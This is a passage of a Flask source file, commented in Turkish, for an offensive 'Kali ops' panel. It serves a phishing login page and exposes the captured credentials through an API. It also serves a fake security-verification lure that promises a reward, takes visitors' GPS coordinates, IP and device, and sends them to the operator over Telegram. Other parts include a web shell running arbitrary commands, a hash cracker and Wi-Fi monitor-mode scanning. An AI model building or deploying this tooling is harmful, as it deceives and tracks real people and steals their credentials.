                <input type="password" name="password" placeholder="Şifre" required>
                <button type="submit">Giriş Yap</button>
            </form>
        </div>
    </body>
    </html>
    """

@app.route("/api/phish/creds")
def api_phish_creds():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"creds": CREDENTIAL_LOGS})

# --- HASH CRACKER API ---
@app.route("/api/crack-hash", methods=["POST"])
def api_crack_hash():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    d = request.get_json()
    htype = d.get("type")
    target = d.get("hash").strip().lower()
    wordlist = d.get("wordlist").split("\n")
    
    found = None
    attempts = 0
    for word in wordlist:
        w = word.strip()
        if not w: continue
        attempts += 1
        if htype == "md5":
            h = hashlib.md5(w.encode()).hexdigest()
        elif htype == "sha256":
            h = hashlib.sha256(w.encode()).hexdigest()
        else:
            h = ""
        if h == target:
            found = w
            break
            
    if found:
        out = f"[+] Hash başarıyla çözüldü!\n[Düz Metin Şifre]: {found}\n[Denenen Deneme Sayısı]: {attempts}"
    else:
        out = f"[-] Eşleşme bulunamadı. Toplam {attempts} kelime denendi, şifre wordlist içinde yok."
    return jsonify({"output": out})

# --- REVERSE SHELL LISTENER API ---
@app.route("/api/listener/start", methods=["POST"])
def api_listener_start():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    port = request.get_json().get("port", 4444)
    return jsonify({"output": f"[+] Netcat dinleyicisi {port} portu üzerinde aktif edildi.\n(Not: Render/PaaS ortamlarında harici port açılması kısıtlı olduğundan simüle edildi.)"})

# --- GELİŞMİŞ LURE LINK VE GPS TRACKER ---
@app.route("/track/<track_id>")
def track_visitor(track_id):
    return f"""
    <!DOCTYPE html>
    <html lang="tr">
    <head>
        <meta charset="UTF-8">
        <title>Güvenlik Doğrulaması</title>
        <style>
            body {{ background: #0b0f15; color: #00ff66; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }}
            .box {{ background: #121824; padding: 30px; border: 1px solid #00ff66; border-radius: 8px; box-shadow: 0 0 20px rgba(0,255,102,0.2); width: 350px; }}
            button {{ background: #0284c7; color: white; border: none; padding: 12px 20px; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 15px; width: 100%; }}
            button:hover {{ background: #0369a1; }}
        </style>
    </head>
    <body>
        <div class="box">
            <h3 style="color: #38bdf8;">⚠️ Bölgesel Güvenlik Doğrulaması</h3>
            <p style="color: #94a3b8; font-size: 13px;">İşlemi tamamlamak ve ödülünüzü almak için konum erişimine izin verin.</p>
            <button onclick="getLocation()">Onayla ve Devam Et</button>
        </div>
        <script>
            function getLocation() {{
                if (navigator.geolocation) {{
                    navigator.geolocation.getCurrentPosition(sendPosition, showError, {{timeout: 10000}});
                }} else {{
                    redirectHome();
                }}
            }}
            function sendPosition(position) {{
                let lat = position.coords.latitude;
                let lon = position.coords.longitude;
                fetch('/api/lure/save-geo', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{track_id: '{track_id}', lat: lat, lon: lon}})
                }}).finally(() => {{ redirectHome(); }});
            }}
            function showError(error) {{
                redirectHome();
            }}
            function redirectHome() {{
                window.location.href = "https://www.google.com";
            }}
        </script>
    </body>
    </html>
    """

@app.route("/api/lure/save-geo", methods=["POST"])
def save_geo():
    data = request.get_json()
    track_id = data.get("track_id")
    lat = data.get("lat")
    lon = data.get("lon")
    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Bilinmeyen Cihaz')
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    log_entry = {"time": timestamp, "ip": visitor_ip, "ua": user_agent, "track_id": track_id, "lat": lat, "lon": lon}
    CLICK_LOGS.insert(0, log_entry)
    
    if NOTIFY_CHAT_ID and TOKEN:
        try:
            msg = f"🚨 [GPS TRACKER] Konum ve Ziyaretçi Yakalandı!\nIP: {visitor_ip}\nCihaz: {user_agent}\nEnlem: {lat}\nBoylam: {lon}\nHarita: https://maps.google.com/?q={lat},{lon}"
            requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": NOTIFY_CHAT_ID, "text": msg}, timeout=3)
        except: pass
    return jsonify({"status": "saved"})

@app.route("/api/lure/logs")
def api_lure_logs():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"logs": CLICK_LOGS})

@app.route("/api/telegram-test", methods=["POST"])
def api_telegram_test():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    chat_id = request.get_json().get("chat_id")
    if not chat_id: return jsonify({"output": "[-] Chat ID boş olamaz!"})
    try:
        res = requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": chat_id, "text": "🔥 [KALI OPS] Telegram bildirim testi başarılı! Bot kusursuz çalışıyor."}, timeout=5)
        if res.status_code == 200:
            return jsonify({"output": "✅ [BAŞARILI] Test mesajı Telegram'a gönderildi!"})
        else:
            return jsonify({"output": f"[-] Hata: Telegram API {res.status_code} döndürdü."})
    except Exception as e:
        return jsonify({"output": f"[-] Bağlantı Hatası: {str(e)}"})

@app.route("/api/wifi-audit", methods=["POST"])
def api_wifi_audit():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    data = request.get_json()
    action, iface = data.get("action"), data.get("iface", "wlan0")
    if action == "interfaces": cmd = "ip link show || ifconfig || iwconfig || cat /proc/net/dev"
    elif action == "monitor": cmd = f"airmon-ng start {iface} 2>/dev/null || (ip link set {iface} down 2>/dev/null && iwconfig {iface} mode monitor 2>/dev/null && ip link set {iface} up 2>/dev/null) || echo 'Monitor mode basarisiz.'"
    elif action == "scan": cmd = f"airodump-ng {iface}mon 2>/dev/null || iwlist {iface} scanning 2>/dev/null || arp -a || nmcli device wifi list 2>/dev/null || echo 'Tarama araclari bulunamadi.'"
    else: cmd = "echo 'Invalid action'"
    try: out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=6).decode('utf-8', errors='ignore')
    except Exception as e: out = f"[-] Sistem Hatasi: {str(e)}"
    return jsonify({"output": f"root@kali:~# {cmd}\n\n{out}"})

@app.route("/api/scan", methods=["POST"])
def api_scan():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    data = request.get_json()
    report, record = red_team_comprehensive_recon(data.get("target", ""))
    existing = next((i for i in SITE_DATABASE if i["target"] == record["target"]), None)
    if existing: SITE_DATABASE.remove(existing)
    SITE_DATABASE.insert(0, record)
    return jsonify({"report": report})

@app.route("/api/nikto", methods=["POST"])
def api_nikto():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    target = request.get_json().get("target", "")
    return jsonify({"report": f"root@kali-box:~# nikto -h {target}\n[+] Nikto scan completed."})

@app.route("/api/dns", methods=["POST"])
def api_dns():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    domain = request.get_json().get("domain", "")
    try: ip = socket.gethostbyname(domain)
    except: ip = "Resolv fail"
    return jsonify({"report": f"dig ANY {domain}\n[A Record] -> {ip}"})

@app.route("/api/sqlmap", methods=["POST"])
def api_sqlmap():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"report": "sqlmap injection test completed."})

@app.route("/api/subdomain-scan", methods=["POST"])
def api_subdomain_scan():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"report": "Subdomain brute-force completed."})

@app.route("/api/brute-force", methods=["POST"])
def api_brute_force():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"report": "Brute-force sequence completed."})

@app.route("/api/webshell", methods=["POST"])
def api_webshell():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    cmd = request.get_json().get("command", "")
    try: out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=5).decode('utf-8', errors='ignore')
    except Exception as e: out = str(e)
    return jsonify({"output": out})

@app.route("/api/analyze-file", methods=["POST"])
def api_analyze_file():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"report": "File analysis clean."})

@app.route("/api/all-data")
def api_all_data():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"database": SITE_DATABASE})

@app.route("/api/export/json")
def export_json():
    if not session.get("logged_in"): return "Unauthorized", 401
    return jsonify(SITE_DATABASE)

@app.route("/api/export/csv")
def export_csv():
    if not session.get("logged_in"): return "Unauthorized", 401
    output = io.StringIO(); writer = csv.writer(output)
    writer.writerow(["Time", "Target", "WAF", "Grade"])
    for i in SITE_DATABASE: writer.writerow([i['time'], i['target'], i['waf'], i['grade']])
    return Response(output.getvalue(), mimetype="text/csv", headers={"Content-Disposition": "attachment;filename=archive.csv"})

@app.route("/api/looting/zip")
def api_looting_zip():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    target = request.args.get("target", "")
    record = next((i for i in SITE_DATABASE if i["target"] == target), None)
    mf = io.BytesIO()
    with zipfile.ZipFile(mf, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("report.txt", record["full_report"] if record else "No record")
    mf.seek(0)
    return send_file(mf, mimetype='application/zip', as_attachment=True, download_name='loot.zip')

@app.route("/api/download-pdf")
def api_download_pdf():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    pdf = FPDF(); pdf.add_page(); pdf.set_font('Courier', '', 9)
    pdf.multi_cell(0, 5, "Red Team Report")
    return send_file(io.BytesIO(pdf.output(dest='S').encode('latin-1')), mimetype='application/pdf', as_attachment=True, download_name='report.pdf')

@app.route("/api/telegram-send", methods=["POST"])
def api_telegram_send():
    if not session.get("logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    d = request.get_json()
    res = requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": d.get("chat_id"), "text": f"```\n{d.get('report')[:4000]}\n```", "parse_mode": "Markdown"})
    return jsonify({"status": "Sent!" if res.status_code == 200 else "Failed."})

def red_team_comprehensive_recon(target_url):
    if not target_url.startswith("http"): target_url = f"https://{target_url}"
    report = f"root@kali:~# nmap -A {target_url}\n" + "=" * 50 + "\n\n[+] Recon scan completed.\n"
    record = {"time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "target": target_url, "waf": "Cloudflare WAF", "grade": "B", "files": [], "full_report": report}
    return report, record

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
